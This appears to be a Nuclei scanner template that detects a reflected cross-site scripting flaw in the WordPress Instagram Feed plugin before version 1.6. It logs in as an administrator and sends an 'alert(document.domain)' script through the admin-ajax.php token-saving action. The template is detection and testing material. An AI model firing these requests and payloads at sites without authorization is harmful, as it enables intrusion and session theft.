flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(header, "wordpress_logged_in")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains_all(body, "<script>alert(document.domain)</script>")
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=sbi_auto_save_tokens&access_token=<script>alert(document.domain)</script>

    '
id: wp-instagram-feed-xss
info:
  author: theamanrawat
  description: 'The Instagram Feed WordPress plugin before 1.6 contains a reflected
    cross-site scripting (XSS) vulnerability due to improper sanitization of user-supplied
    input, allowing attackers to inject malicious scripts via crafted requests.

    '
  impact: 'Attackers with administrator privileges can execute malicious Javascript
    in the context of the site, potentially stealing cookies or hijacking user sessions.

    '
  metadata:
    max-requests: 2
    public-www: /wp-content/plugins/instagram-feed/
    verified: false
  name: Instagram Feed < 1.6 - Cross-Site Scripting
  reference:
  - https://dumpco.re/blog/xss-instagram-feed
  - https://wordpress.org/plugins/instagram-feed
  remediation: 'Update to version 1.6 or later.

    '
  severity: medium
  tags: wordpress,wp,instagram-feed,xss,authenticated
